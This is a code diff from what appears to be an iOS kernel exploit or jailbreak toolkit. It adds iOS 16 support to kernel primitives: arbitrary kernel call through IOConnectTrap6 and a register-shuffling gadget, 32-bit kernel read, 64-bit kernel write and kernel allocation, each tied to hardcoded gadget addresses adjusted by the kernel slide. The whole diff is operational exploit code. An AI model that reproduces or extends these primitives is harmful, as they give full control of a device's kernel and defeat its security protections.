@@ -1,5 +1,6 @@
 #import "kernel.h"
 #import "utils.h"
+#import "offsets.h"
 
 io_connect_t user_client = 0;
 
@@ -41,7 +42,15 @@ uint64_t get_kernel_slide() {
 // }
 
 uint64_t kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5) {
-    uint64_t x6 = addr; // BR X6
+    if (@available(iOS 16, *)) {
+        // mov x0, x3
+        // br x4
+        x4 = addr;
+        x3 = x0;
+        return IOConnectTrap6(user_client, 0, x1, x2, x3, x4, x5, 0);
+    }
+
+    uint64_t x6 = addr;  // BR X6
     // x0 -> x1
     // x1 -> x2
     // x2 -> x3
@@ -52,6 +61,10 @@ uint64_t kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3
 }
 
 uint32_t kread32(uint64_t addr) {
+    if (@available(iOS 16, *)) {
+        return (uint32_t)kcall(0xfffffff0072136cc + get_kernel_slide(), addr, 0, 0, 0, 0, 0);
+    }
+
     return (uint32_t)kcall(0xFFFFFFF009446D08 + get_kernel_slide(), 0, addr, 0, 0, 0, 0);
 }
 
@@ -81,7 +94,7 @@ void kread_string(uint64_t addr, char *out) {
 
 uint64_t kalloc(size_t ksize) {
     // kalloc slightly more
-    uint64_t r = kcall(0xFFFFFFF0080B1008 + get_kernel_slide(), kernel_info.fake_userclient + 0x200, ksize / 8 + 8, 0, 0, 0, 0);
+    uint64_t r = kcall(off_container_init + get_kernel_slide(), kernel_info.fake_userclient + 0x200, ksize / 8 + 8, 0, 0, 0, 0);
     if (r == 0) return 0;
     uint32_t low32 = kread32(kernel_info.fake_userclient + 0x200 + 0x20);
     uint32_t high32 = kread32(kernel_info.fake_userclient + 0x200 + 0x20 + 0x4);
@@ -90,6 +103,11 @@ uint64_t kalloc(size_t ksize) {
 }
 
 void kwrite64(uint64_t addr, uint64_t data) {
+    if (@available(iOS 16, *)) {
+        kcall(0xfffffff007213788 + get_kernel_slide(), addr, data, 0, 0, 0, 0);
+        return;
+    }
+
     kcall(0xFFFFFFF007BADBB8 + get_kernel_slide(), addr, data, addr, 0, 0, 0);
 }
 
